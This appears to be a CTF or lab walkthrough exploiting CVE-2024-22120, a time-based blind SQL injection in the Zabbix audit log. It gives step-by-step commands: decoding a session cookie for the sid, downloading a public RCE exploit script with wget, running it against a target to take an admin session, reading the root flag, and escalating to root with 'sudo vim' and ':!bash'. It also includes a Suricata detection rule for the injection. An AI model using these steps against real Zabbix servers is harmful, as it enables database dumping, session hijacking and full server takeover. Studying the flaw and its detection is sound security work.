# CVE-2024-22120 in Zabbix
**Introduction**

Zabbix: system monitoring.
The architecture of Zabbit: server, database storage, web interface, proxy,agent, dashboards

In CVE-2024-22120, a time-based blind SQL injection vulnerability was identified in the Zabbix server's Audit Log feature, which could allow a low-level user to dump the database, leading to remote code execution (RCE) and full control of the Zabbix server.

**Vulnerability Overview:**
The vulnerability was discovered in Zabbix versions:
6.0.0 - 6.0.27
6.4.0 - 6.4.12
7.0.0alpha1 - 7.0.0beta1

CVE-2024-22120 allows low-privileged users to execute SQL injection attacks via the Audit Log feature. The clientip field in the log is improperly sanitized, allowing attackers to inject SQL queries that exploit time-based blind SQL injection.

**Reproduce**
Step 1 : Gather Exploit Prerequisites
Session ID (sid): This is required to authenticate the low-privileged user to the Zabbix server.
Host ID (hostid): This can be obtained from the Zabbix dashboard or web interface.

Obtain Session ID and Host ID:
Login to Zabbix -> get cookie
```bash
eyJzZXNzaW9uaWQiOiI3YTJjMmQ0N2NjZmYyZGRmMTU3ZmVmYzgwZmQ3MTNjMSIsInNlcnZlckNoZWNrUmVzdWx0Ijp0cnVlLCJzZXJ2ZXJDaGVja1RpbWUiOjE3NTU3MDIwNzAsInNpZ24iOiJlYzYwYjMwYzI4NDNjNTQ5YTU2YmRhNTk3OWFhMWY5MDVhMjdkMmI3YTFiMTczMTQ1NDRmY2NlZWEwMjE2MDdhIn0%3D
```
decoded it 
sid: 7a2c2d47ccff2ddf157fefc80fd713c1
search in dev tools -> hostids: 10084
Step 2 : Exploit the SQL Injection
```bash
wget https://raw.githubusercontent.com/W01fh4cker/CVE-2024-22120-RCE/refs/heads/main/CVE-2024-22120-RCE.py
```
pip3 install pwn
python3 CVE-2024-22120-RCE.py --ip <Target_IP> --sid <Session_ID> --hostid <Host_ID>

Get administrator's session ID
```bash
(!) sessionid=0b1ab84721d989c27e3214af2959f254989c27e3214af2959f254
```

```bash
python3 CVE-2024-22120-RCE.py --ip 10.129.231.23 --sid  --hostid 10084 
```
cat /root/root.txt

```
alert tcp any any -> $HOME_NET any (msg:"ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-2024-22120)"; content:"ZBXD|01|"; fast_pattern; startswith; content:"|22|clientip|22 3a|"; pcre:"/^[^\x2c]*(?:(?:S(?:HOW\x20(?:C(?:UR(?:DAT|TIM)E|HARACTER\x20SET)|(?:VARI|T)ABLES)|ELECT\x20(?:FROM|USER))|U(?:NION\x20SELEC|PDATE\x20SE)T|DELETE\x20FROM|INSERT\x20INTO)|S(?:HOW.+(?:C(?:HARACTER.+SET|UR(DATE|TIME))|(?:VARI|T)ABLES)|ELECT.+(?:FROM|USER))|U(?:NION.+SELEC|PDATE.+SE)T|DELETE.+FROM|INSERT.+INTO|\x2f\*.+\*\x2f)?/Ri"; reference:url,support.zabbix.com/browse/ZBX-24505; reference:cve,2024-22120; classtype:web-application-attack; sid:2055989; rev:1; metadata:affected_product Zabbix, attack_target Server, tls_state plaintext, created_at 2024_09_19, cve CVE_2024_22120, deployment Perimeter, deployment Internal, performance_impact Moderate, confidence High, signature_severity Major, tag Exploit, updated_at 2024_09_19, mitre_tactic_id TA0001, mitre_tactic_name Initial_Access, mitre_technique_id T1190, mitre_technique_name Exploit_Public_Facing_Application; target:dest_ip;)
```

sudo vim
:!bash